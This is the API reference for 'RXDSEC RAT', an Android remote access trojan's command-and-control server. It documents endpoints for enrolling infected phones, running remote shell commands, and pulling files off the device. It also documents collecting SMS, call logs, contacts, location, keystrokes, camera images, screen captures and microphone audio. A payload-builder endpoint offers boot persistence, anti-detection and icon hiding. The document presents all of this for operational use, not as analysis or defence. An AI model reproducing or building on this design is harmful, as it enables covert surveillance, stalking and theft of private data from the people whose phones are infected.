# RXDSEC RAT API Reference

This document provides a detailed reference of all API endpoints available in the RXDSEC RAT server, including request formats, authentication requirements, and response structures.

## Authentication

### Authentication Mechanism
The API uses token-based authentication. All API requests (except for device registration) must include:
- `Device-ID` header containing the unique device identifier
- `Authorization` header containing the authentication token

### Authentication Flow
1. Device registers via the registration endpoint
2. Server issues an authentication token
3. All subsequent requests use this token
4. Token is refreshed periodically for security

## API Endpoints

### Device Management

#### Register Device
```
POST /api/v1/device/register
```

Registers a new device with the server.

**Request Body:**
```json
{
  "device_id": "unique-device-id-string",
  "android_version": "11",
  "api_level": 30,
  "model": "Pixel 4",
  "manufacturer": "Google",
  "ip_address": "192.168.1.100",
  "phone_number": "+1234567890",
  "imei": "123456789012345",
  "is_rooted": false,
  "is_emulator": false
}
```

**Response:**
```json
{
  "status": "success",
  "message": "Device registered successfully",
  "token": "authentication-token-string",
  "device": {
    "id": 1,
    "device_id": "unique-device-id-string",
    "name": null,
    "user_id": 1
  }
}
```

#### Device Heartbeat
```
POST /api/v1/device/heartbeat
```

Updates the device's online status and last seen timestamp.

**Request Body:**
```json
{
  "is_screen_on": true,
  "battery_level": 85,
  "network_type": "WIFI",
  "current_app": "com.android.settings"
}
```

**Response:**
```json
{
  "status": "success",
  "message": "Heartbeat acknowledged",
  "server_time": "2025-03-28T10:15:30Z"
}
```

### Command Execution

#### Get Pending Commands
```
GET /api/v1/commands
```

Retrieves any pending commands for the device.

**Response:**
```json
{
  "status": "success",
  "commands": [
    {
      "id": 1,
      "command_text": "ls -la /sdcard",
      "type": "shell",
      "created_at": "2025-03-28T10:10:25Z"
    },
    {
      "id": 2,
      "command_text": "am start -a android.intent.action.VIEW -d https://example.com",
      "type": "app",
      "created_at": "2025-03-28T10:12:40Z"
    }
  ]
}
```

#### Update Command Status
```
POST /api/v1/command/{command_id}/update
```

Updates the status of a command after execution.

**Request Body:**
```json
{
  "status": "executed",
  "result": "drwxr-xr-x 4 root root 4096 Mar 28 10:00 Downloads\ndrwxr-xr-x 2 root root 4096 Mar 28 09:50 DCIM\n...",
  "error": null
}
```

**Response:**
```json
{
  "status": "success",
  "message": "Command status updated"
}
```

### File Management

#### Get Pending File Transfers
```
GET /api/v1/file_transfers
```

Retrieves any pending file transfers for the device.

**Response:**
```json
{
  "status": "success",
  "transfers": [
    {
      "id": 1,
      "file_path": "/sdcard/Download/",
      "file_name": "document.pdf",
      "direction": "download",
      "created_at": "2025-03-28T09:45:20Z"
    },
    {
      "id": 2,
      "file_path": "/sdcard/DCIM/Camera/",
      "file_name": "IMG_20250328_1234.jpg",
      "direction": "upload",
      "created_at": "2025-03-28T10:05:15Z"
    }
  ]
}
```

#### Update File Transfer Status
```
POST /api/v1/file_transfer/{transfer_id}/update
```

Updates the status of a file transfer.

**Request Body:**
```json
{
  "status": "completed",
  "file_size": 2048576,
  "error": null
}
```

**Response:**
```json
{
  "status": "success",
  "message": "File transfer status updated"
}
```

#### Upload File
```
POST /api/v1/file/upload
```

Uploads a file from the device to the server.

**Request:**
Multipart form data with:
- `transfer_id`: ID of the file transfer
- `file`: File data

**Response:**
```json
{
  "status": "success",
  "message": "File uploaded successfully",
  "file_path": "/uploads/device_1/IMG_20250328_1234.jpg"
}
```

#### Download File
```
GET /api/v1/file/download/{transfer_id}
```

Downloads a file from the server to the device.

**Response:**
Binary file data with appropriate content type and filename headers.

### Surveillance

#### Submit Screen Capture
```
POST /api/v1/surveillance/screen
```

Submits a screen capture from the device.

**Request:**
Multipart form data with:
- `timestamp`: Capture timestamp
- `format`: Image format (jpg/png)
- `screen_image`: Image data

**Response:**
```json
{
  "status": "success",
  "message": "Screen capture received"
}
```

#### Submit SMS Messages
```
POST /api/v1/surveillance/sms
```

Submits collected SMS messages from the device.

**Request Body:**
```json
{
  "messages": [
    {
      "message_id": "sms_12345",
      "address": "+1234567890",
      "body": "Hello, how are you?",
      "date": "2025-03-28T08:30:15Z",
      "type": 1,
      "read": true
    },
    {
      "message_id": "sms_12346",
      "address": "+9876543210",
      "body": "Meeting at 2pm tomorrow",
      "date": "2025-03-28T09:15:45Z",
      "type": 2,
      "read": false
    }
  ]
}
```

**Response:**
```json
{
  "status": "success",
  "message": "SMS messages received",
  "count": 2
}
```

#### Submit Call Logs
```
POST /api/v1/surveillance/calls
```

Submits call logs from the device.

**Request Body:**
```json
{
  "calls": [
    {
      "call_id": "call_12345",
      "number": "+1234567890",
      "name": "John Doe",
      "date": "2025-03-28T07:45:10Z",
      "duration": 125,
      "type": 1,
      "recording_path": null
    },
    {
      "call_id": "call_12346",
      "number": "+9876543210",
      "name": "Jane Smith",
      "date": "2025-03-28T08:30:00Z",
      "duration": 0,
      "type": 3,
      "recording_path": null
    }
  ]
}
```

**Response:**
```json
{
  "status": "success",
  "message": "Call logs received",
  "count": 2
}
```

#### Submit Contacts
```
POST /api/v1/surveillance/contacts
```

Submits contacts from the device.

**Request Body:**
```json
{
  "contacts": [
    {
      "contact_id": "contact_12345",
      "name": "John Doe",
      "phone_numbers": "[{\"+1234567890\":\"mobile\"}]",
      "emails": "[{\"john@example.com\":\"work\"}]"
    },
    {
      "contact_id": "contact_12346",
      "name": "Jane Smith",
      "phone_numbers": "[{\"+9876543210\":\"mobile\",\"+1122334455\":\"home\"}]",
      "emails": "[{\"jane@example.com\":\"personal\"}]"
    }
  ]
}
```

**Response:**
```json
{
  "status": "success",
  "message": "Contacts received",
  "count": 2
}
```

#### Submit Location
```
POST /api/v1/surveillance/location
```

Submits location data from the device.

**Request Body:**
```json
{
  "latitude": 37.7749,
  "longitude": -122.4194,
  "accuracy": 10.5,
  "altitude": 12.3,
  "speed": 0.0,
  "address": "123 Main St, San Francisco, CA"
}
```

**Response:**
```json
{
  "status": "success",
  "message": "Location received"
}
```

#### Submit Keylog Data
```
POST /api/v1/surveillance/keylog
```

Submits keylogging data from the device.

**Request Body:**
```json
{
  "entries": [
    {
      "application": "com.android.chrome",
      "text": "user@example.com",
      "captured_at": "2025-03-28T09:10:25Z"
    },
    {
      "application": "com.android.messaging",
      "text": "Hello, when will you arrive?",
      "captured_at": "2025-03-28T09:15:40Z"
    }
  ]
}
```

**Response:**
```json
{
  "status": "success",
  "message": "Keylog data received",
  "count": 2
}
```

#### Submit Camera Image
```
POST /api/v1/surveillance/camera
```

Submits a camera image from the device.

**Request:**
Multipart form data with:
- `camera_id`: Camera identifier (0 = back, 1 = front)
- `timestamp`: Capture timestamp
- `image`: Image data

**Response:**
```json
{
  "status": "success",
  "message": "Camera image received"
}
```

#### Submit Audio Recording
```
POST /api/v1/surveillance/audio
```

Submits an audio recording from the device.

**Request:**
Multipart form data with:
- `duration`: Recording duration in seconds
- `timestamp`: Recording timestamp
- `format`: Audio format (mp3/wav)
- `audio`: Audio data

**Response:**
```json
{
  "status": "success",
  "message": "Audio recording received"
}
```

### APK Binding

#### Generate Custom Payload
```
POST /api/v1/binding/generate
```

Generates a customized payload based on configurations.

**Request Body:**
```json
{
  "binding_id": "binding_12345",
  "configs": {
    "persistence": "boot_receiver",
    "anti_detection": true,
    "hide_icon": true,
    "surveillance": {
      "camera": true,
      "microphone": true,
      "location": true,
      "sms": true,
      "calls": true,
      "contacts": true,
      "keylogger": false
    }
  }
}
```

**Response:**
```json
{
  "status": "success",
  "message": "Payload generated successfully",
  "download_url": "/api/v1/binding/download/binding_12345.apk"
}
```

## Error Responses

All API endpoints follow a consistent error response format:

```json
{
  "status": "error",
  "error": "error_code",
  "message": "Human-readable error message"
}
```

### Common Error Codes

| Error Code | HTTP Status | Description |
|------------|-------------|-------------|
| `authentication_failed` | 401 | Invalid or missing authentication credentials |
| `invalid_device` | 400 | Device ID is invalid or not registered |
| `invalid_request` | 400 | Request is malformed or missing required fields |
| `not_found` | 404 | Requested resource not found |
| `server_error` | 500 | Internal server error |
| `permission_denied` | 403 | Insufficient permissions for the requested operation |
| `rate_limited` | 429 | Too many requests, rate limit exceeded |

## Versioning

The API uses versioning in the URL path (`/api/v1/`) to ensure compatibility as the system evolves. Future versions will be accessible via `/api/v2/`, etc.

## Data Types

| Field | Format | Description |
|-------|--------|-------------|
| `timestamp` / `date` | ISO 8601 | UTC timestamps in format `YYYY-MM-DDTHH:MM:SSZ` |
| `phone_number` | E.164 | International format with + prefix, e.g., `+12345678901` |
| `device_id` | String | Alphanumeric string, uniquely identifying a device |
| `file_path` | String | Path on device or server, using forward slashes `/` |
| `coordinates` | Float | Decimal degrees, e.g., `37.7749` (latitude), `-122.4194` (longitude) |
| `duration` | Integer | Duration in seconds |
| `file_size` | Integer | Size in bytes |

## Rate Limiting

API requests are subject to rate limiting to prevent abuse. Current limits:

- Registration: 5 requests per IP per hour
- Commands: 60 requests per device per minute
- File transfers: 10 requests per device per minute
- Surveillance data: 30 requests per device per minute

Rate limit headers are included in responses:
- `X-RateLimit-Limit`: Total requests allowed in period
- `X-RateLimit-Remaining`: Requests remaining in period
- `X-RateLimit-Reset`: Timestamp when limit resets

## Webhook Notifications

For integration with other systems, RXDSEC RAT can send webhook notifications for various events. Configure webhooks in the server settings.

### Webhook Event Types

- `device.connected`: Device comes online
- `device.disconnected`: Device goes offline
- `command.executed`: Command execution completed
- `file.transferred`: File transfer completed
- `surveillance.new_data`: New surveillance data received